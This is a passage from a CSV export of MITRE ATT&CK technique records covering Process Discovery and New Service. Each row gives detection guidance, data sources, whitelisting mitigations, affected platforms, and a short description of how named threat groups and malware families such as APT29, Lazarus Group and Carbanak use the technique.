2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: NETEAGLE,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
935,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0059|WinMM]] sets a WH_CBT Windows hook to collect information on process creation.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: WinMM,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
936,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to discover processes running on a system.[[CiteRef::Microsoft Tasklist]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Tasklist,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
937,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0038|Stealth Falcon]] malware gathers a list of running processes.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
938,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0154|Cobalt Strike]]\'s ""beacon"" payload can collect information on process details.[[CiteRef::cobaltstrike manual]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Cobalt Strike,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
939,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0093|Backdoor.Oldrea]] collects information about running processes.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: Backdoor.Oldrea, Havex",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
940,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0094|Trojan.Karagany]] can use tasklist to collect a list of running tasks.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Trojan.Karagany,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
941,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0049|GeminiDuke]] collects information on running processes and environment variables from the victim.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: GeminiDuke,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
942,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']","[""[[Software/S0139|PowerDuke]] has a command to list the victim's processes.[[CiteRef::Volexity PowerDuke November 2016]]""]",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: PowerDuke,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
943,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']","['After compromising a victim, [[Group/G0033|Poseidon Group]] lists all running processes.[[CiteRef::Kaspersky Poseidon Group]]']",['Poseidon Group'],['Poseidon Group'],['G0033'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
944,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['Several [[Group/G0032|Lazarus Group]] malware families gather a list of running processes on a victim system and send it to their C2 server.[[CiteRef::Novetta Blockbuster Loaders]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
945,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0063|SHOTPUT]] has a command to obtain a process listing.[[CiteRef::Palo Alto CVE-2015-3113 July 2015]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: SHOTPUT, Backdoor.APT.CookieCutter, Pirpi",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
946,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0064|ELMER]] is capable of performing process listings.[[CiteRef::FireEye EPS Awakens Part 2]]'],['APT16'],['APT16'],['G0023'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: ELMER,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
947,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0144|ChChes]] collects its process identifier (PID) on the victim.[[CiteRef::Palo Alto menuPass Feb 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: ChChes, Scorpion, HAYMAKER",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
948,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']","[""[[Software/S0144|ChChes]] collects the victim's running process IDs.[[CiteRef::FireEye APT10 April 2017]]""]",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: ChChes, Scorpion, HAYMAKER",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
949,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0062|DustySky]] collects information about running processes from victims.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']","Software: DustySky, NeD Worm",['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
950,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0021|Molerats]] actors obtained a list of active processes on the victim and sent them to C2 servers.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
951,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0008|Carbanak]] malware installs itself as a service to provide persistence and SYSTEM privileges.[[CiteRef::Kaspersky Carbanak]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
952,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['Some [[Software/S0074|Sakula]] samples install themselves as services for persistence by calling WinExec with the <code>net start</code> argument.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Sakula, Sakurel, VIPER","['Persistence', 'Privilege Escalation']",['Technique/T1050'],['New Service'],https://attack.mitre.org/wiki/Technique/T1050
